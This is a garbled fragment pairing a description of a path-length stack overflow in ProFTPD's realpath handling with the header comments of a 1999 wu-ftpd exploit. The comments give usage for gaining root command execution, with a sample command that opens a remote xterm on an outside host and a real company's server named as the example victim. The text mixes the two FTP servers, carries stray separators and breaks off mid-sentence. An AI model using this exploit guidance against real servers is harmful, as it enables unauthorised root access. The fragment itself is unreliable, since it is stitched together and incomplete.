This vulnerability is a buffer overflow triggered by unusually long path names ( directory structures ) . For example , if a user has write privilages he or she may create an unusually long pathname which due to insuficient bounds checking in ProFTPD will overwrite the stack. This will allow the attacker to insert their own instruction set on the stack to be excuted thereby elavating their access. ， The problem is in a bad implementation of the \"realpath\" function. ，  * / ， / *  ，  * SDI wu-ftpd exploit for Linux ( Feb 20 , 1999 )  ，  * - Brazilian Information Security Team. ，  * Source by jamez ( jamez @ sekure.org )  ，  * c0nd0r ( condor @ sekure.org )  ，  * This source let you execute commands as root if you have write ，  * access on the ftp server. ，  * Usage :  ，  * gcc SDI-wu.c -o SDI-wu ，  * ./SDI-wu host user password dir command type [ port ]  [ align ]  ，  * host : the victim ( ftp.microsoft.com )  ，  * user : ftp user with write access ( anonymous )  ，  * password : the password for the user ( foo @ bar.com )  ，  * dir : the directory you have access ( /incoming )  ，  * command : the command ( \"/usr/X11R6/bin/xterm -display www.host.com : 0\" )  ，  * type : system type ( see below )  ，  * port : ftp port ( 21 default )  ，  * align : the alignment ( default 3 )  ，  * Limitations :  ，  * because I've used hard coded address's for system and the command ,  ，  * the values wont be the same in others compilations of wu-ftpd. ，  * so , you will need to find the address for the version ，  * you want to exploit. ，  * because we are not using the stack to put our code , the exploit ，  * will work as well against a non-executable stack patch. ，  * RECOMENDATION = Please , run gdb through the wu.ftpd binary in order to ，  * find out your \"system address\" ( ie : ",
